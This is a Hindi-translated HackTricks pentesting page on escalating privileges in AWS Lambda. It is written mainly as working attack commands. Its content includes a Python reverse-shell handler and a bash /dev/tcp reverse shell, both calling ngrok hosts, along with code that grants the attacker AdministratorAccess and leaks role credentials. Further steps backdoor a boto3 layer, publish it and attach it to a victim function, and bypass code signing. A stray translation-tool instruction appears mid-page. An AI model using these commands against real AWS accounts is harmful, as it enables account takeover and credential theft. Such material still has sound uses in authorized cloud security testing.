# AWS - Lambda Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## lambda

More info about lambda in:

{{#ref}}
../../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

जिन उपयोगकर्ताओं के पास **`iam:PassRole`, `lambda:CreateFunction`, and `lambda:InvokeFunction`** permissions हैं, वे अपनी privileges escalate कर सकते हैं।\
वे **एक नया Lambda function बना सकते हैं और उसे किसी मौजूदा IAM role को असाइन कर सकते हैं**, जिससे उस function को उस role से जुड़ी permissions मिल जाती हैं। उपयोगकर्ता फिर इस Lambda function में **code लिखकर और upload करके (उदाहरण के लिए rev shell के साथ)** दे सकता है।\
एक बार function सेटअप हो जाने पर, उपयोगकर्ता इसके execution को **trigger** कर सकता है और AWS API के माध्यम से Lambda function को invoke करके इच्छित क्रियाएं करवा सकता है। यह तरीका प्रभावी रूप से उपयोगकर्ता को Lambda function के जरिए अप्रत्यक्ष रूप से काम करने की अनुमति देता है, उस IAM role को दिए गए access स्तर के साथ जो उससे जुड़ा होता है।\\

एक attacker इसका दुरुपयोग करके **rev shell प्राप्त कर सकता है और token चुरा सकता है**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
आप lambda function से ही **abuse the lambda role permissions** भी कर सकते हैं.\
यदि lambda role के पास पर्याप्त permissions हों तो आप इसका उपयोग अपने लिए admin rights देने के लिए कर सकते हैं:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
बाहरी कनेक्शन की आवश्यकता के बिना lambda's role credentials को leak करना भी संभव है। यह internal tasks पर उपयोग होने वाले **Network isolated Lambdas** के लिए उपयोगी होगा। यदि कोई unknown security groups आपके reverse shells को फ़िल्टर कर रहे हैं, तो यह कोड का टुकड़ा आपको सीधे lambda के आउटपुट के रूप में credentials leak करने की अनुमति देगा।
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**संभावित प्रभाव:** निर्दिष्ट किसी भी lambda service role पर सीधे privesc।

> [!CAUTION]
> ध्यान दें कि भले ही यह रोचक लग सकता है, **`lambda:InvokeAsync`** **नहीं** स्वयं में **`aws lambda invoke-async` को निष्पादित करने** की अनुमति देता; आपको `lambda:InvokeFunction` भी चाहिए।

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

पिछले परिदृश्य की तरह, आप **स्वयं को `lambda:InvokeFunction` प्रदान कर सकते हैं** यदि आपके पास **`lambda:AddPermission`** अनुमति है।
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potential Impact:** निर्दिष्ट किसी भी lambda service role पर प्रत्यक्ष privesc।

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

जिन उपयोगकर्ताओं के पास **`iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping`** अनुमतियाँ हैं (और संभवतः `dynamodb:PutItem` और `dynamodb:CreateTable`), वे `lambda:InvokeFunction` के बिना भी अप्रत्यक्ष रूप से **escalate privileges** कर सकते हैं।\
वे एक **Lambda function में दुर्भावनापूर्ण कोड डालकर और इसे किसी मौजूदा IAM role को असाइन करके** बना सकते हैं।

Lambda को सीधे invoke करने के बजाय, उपयोगकर्ता एक मौजूदा DynamoDB table सेटअप करता है या उपयोग करता है, और इसे event source mapping के माध्यम से Lambda से लिंक करता है। यह सेटअप सुनिश्चित करता है कि तालिका में एक नया आइटम दर्ज होते ही Lambda function **स्वचालित रूप से ट्रिगर हो** — चाहे वह आइटम उपयोगकर्ता की कार्रवाई से हो या किसी अन्य प्रक्रिया से — इस तरह Lambda function अप्रत्यक्ष रूप से invoke होता है और पास किए गए IAM role की permissions के साथ कोड execute करता है।
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
यदि DynamoDB पहले से AWS पर्यावरण में सक्रिय है, तो उपयोगकर्ता को केवल Lambda फ़ंक्शन के लिए **event source mapping स्थापित करने की आवश्यकता** है। हालांकि, यदि DynamoDB उपयोग में नहीं है, तो उपयोगकर्ता को **एक नया table बनाना** होगा जिसमें स्ट्रीमिंग सक्षम हो:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
अब **Lambda function को DynamoDB table से कनेक्ट करना** **event source mapping बनाकर** संभव है:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Lambda function के DynamoDB stream से linked होने पर attacker **DynamoDB stream को सक्रिय करके Lambda को अप्रत्यक्ष रूप से ट्रिगर कर सकता है**। यह DynamoDB table में **आइटम डालकर** किया जा सकता है:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potential Impact:** निर्दिष्ट lambda service role पर सीधे privesc।

### `lambda:AddPermission`

इस permission वाले attacker **खुद को (या दूसरों को) कोई भी permissions दे सकता है** (यह resource based policies बनाता है जो resource तक access प्रदान करती हैं):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**संभावित प्रभाव:** कोड को संशोधित करने और चलाने की अनुमति देकर lambda service role पर सीधे privesc।

### `lambda:AddLayerVersionPermission`

एक हमलावर जिसके पास यह अनुमति है वह **खुद को (या दूसरों को) अनुमति `lambda:GetLayerVersion` दे सकता है**। वह layer तक पहुँचकर कमजोरियों या संवेदनशील जानकारी की खोज कर सकता है।
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Potential Impact:** संवेदनशील जानकारी तक संभावित पहुँच।

### `lambda:UpdateFunctionCode`

जो उपयोगकर्ता **`lambda:UpdateFunctionCode`** permission रखते हैं, उनके पास उस मौजूदा Lambda फ़ंक्शन के कोड को बदलने की क्षमता होती है जो किसी IAM role से जुड़ा हुआ है।\
हमलावर **Lambda के कोड को बदलकर IAM credentials को exfiltrate कर सकता है।**

हालाँकि हमलावर के पास सीधे उस फ़ंक्शन को invoke करने की क्षमता न हो, यदि Lambda फ़ंक्शन पहले से मौजूद और कार्यरत है, तो यह संभव है कि यह मौजूदा वर्कफ़्लोज़ या इवेंट्स के माध्यम से trigger हो जाए, जिससे बदले गए कोड के निष्पादन में अप्रत्यक्ष रूप से मदद मिलती है।
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Potential Impact:** इस्तेमाल किए गए lambda service role पर सीधा privesc।

### `lambda:UpdateFunctionConfiguration`

#### RCE env variables के जरिए

इन permissions के साथ environment variables जोड़ना संभव है जो Lambda को मनमाना कोड चलाने का कारण बनेंगे। उदाहरण के लिए python में environment variables `PYTHONWARNING` और `BROWSER` का दुरुपयोग करके किसी python process को मनमाना commands execute करवाया जा सकता है:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
अन्य scripting languages के लिए उपयोग करने योग्य अन्य env variables हैं। अधिक जानकारी के लिए scripting languages के उपखंड देखें:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE via Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) आपको आपके lamdba function में **code** शामिल करने की अनुमति देता है, लेकिन इसे अलग से स्टोर करके, ताकि function code छोटा रह सके और **several functions can share code**।

lambda के अंदर आप उन paths को देख सकते हैं जहाँ से python code लोड होता है, नीचे दिए गए function की तरह:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
These are the places:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

उदाहरण के लिए, लाइब्रेरी boto3 `/var/runtime/boto3` से लोड होती है (4th position).

#### Exploitation

आप permission `lambda:UpdateFunctionConfiguration` का दुरुपयोग करके किसी lambda function में **नई layer जोड़** सकते हैं। किसी भी कोड को निष्पादित करने के लिए, इस layer में कुछ ऐसा **library होना चाहिए जिसे lambda import करने वाला है।** यदि आप lambda का code पढ़ सकते हैं, तो आप इसे आसानी से ढूंढ सकते हैं। ध्यान दें कि संभव है कि lambda पहले से ही किसी layer का **उपयोग कर रहा** हो और आप उस layer को **डाउनलोड** करके उसमें **अपना code जोड़** सकें।

उदाहरण के लिए, मान लीजिए कि lambda लाइब्रेरी boto3 का उपयोग कर रहा है, तो यह लाइब्रेरी के नवीनतम संस्करण के साथ एक स्थानीय layer बनाएगा:
```bash
pip3 install -t ./lambda_layer boto3
```
आप `./lambda_layer/boto3/__init__.py` खोल सकते हैं और **add the backdoor in the global code** (a function to exfiltrate credentials or get a reverse shell for example).

फिर, उस `./lambda_layer` डायरेक्टरी को zip करें और **upload the new lambda layer** अपने खाते में (या victims के खाते में, लेकिन आपके पास इसके लिए permissions नहीं हो सकती हैं).\
ध्यान दें कि आपको एक python folder बनाना होगा और लाइब्रेरीज़ वहाँ रखनी होंगी ताकि /opt/python/boto3 को ओवरराइड किया जा सके। इसके अलावा, layer को lambda द्वारा उपयोग की जाने वाली **compatible with the python version** होना चाहिए और अगर आप इसे अपने खाते में अपलोड करते हैं, तो यह **same region:** में होना चाहिए।
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
अब अपलोड की गई lambda layer को **किसी भी खाते द्वारा पहुँच योग्य** बनाएं:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
और lambda layer को victim lambda function में जोड़ें:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
अगला कदम या तो अगर संभव हो तो खुद से **invoke the function** करना होगा या सामान्य तरीकों से इसके **invoke होने** तक इंतज़ार करना — जो कि अधिक सुरक्षित तरीका है।

A **more stealth way to exploit this vulnerability** can be found in:

{{#ref}}
../../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Potential Impact:** उपयोग किए गए lambda service role पर direct privesc।

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

शायद इन permissions के साथ आप एक function बना कर उसे URL को कॉल करके execute कर पाएँ... पर मैं इसे टेस्ट करने का तरीका खोज नहीं पाया, तो अगर आप कर पाते हैं तो मुझे बताइए!

### Lambda MitM

कुछ lambdas parameters में users से **sensitive info प्राप्त कर रहे होंगे।** अगर उनमें से किसी में RCE मिल जाए तो आप उन अन्य users द्वारा भेजी जा रही info को exfiltrate कर सकते हैं, इसे देखें:

{{#ref}}
../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## References

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

यदि कोई Lambda function code signing लागू करता है, तो एक attacker जो या तो Code Signing Config (CSC) को हटा सके या उसे Warn पर downgrade कर सके, unsigned code को function में deploy कर सकता है। यह integrity protections को bypass करता है बिना function के IAM role या triggers को modify किए।

Permissions (one of):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Notes:
- For Path B, you don't need an AWS Signer profile if the CSC policy is set to `WARN` (unsigned artifacts allowed).

Steps (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Prepare a small payload:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
पाथ A) CSC हटाएँ, फिर कोड अपडेट करें:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Path B) Warn पर डाउनग्रेड करें और कोड अपडेट करें (यदि हटाने की अनुमति नहीं है):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Verified. मैं src/pentesting-cloud/aws-security/aws-privilege-escalation/aws-lambda-privesc/README.md में मौजूद प्रासंगिक अंग्रेज़ी टेक्स्ट का हिंदी में अनुवाद करूँगा, साथ ही निम्न बातों का पालन करूँगा:
- Markdown/HTML syntax बिल्कुल वैसा ही रहेंगे।
- कोड, hacking technique names, सामान्य hacking शब्द, cloud/SaaS platform नाम (जैसे Workspace, aws, gcp...), "leak", pentesting, links और paths अनुवादित नहीं होंगे।
- tags, refs और paths (जैसे {#tabs}, {#tab name="Method1"}, {#ref}...) जैसे मूल रूप में रहने चाहिए।
- मैं कोई अतिरिक्त सामग्री नहीं जोड़ूँगा और Unicode मान्य रखूँगा।
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
संभावित प्रभाव: उस फ़ंक्शन में मनमाना बिना-साइन किए गए कोड को push और रन करने की क्षमता, जो साइन किए गए deployments को लागू करने के लिए बनी थी — संभावित रूप से फ़ंक्शन रोल की अनुमतियों के साथ कोड निष्पादन की ओर ले जा सकती है।

सफाई:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

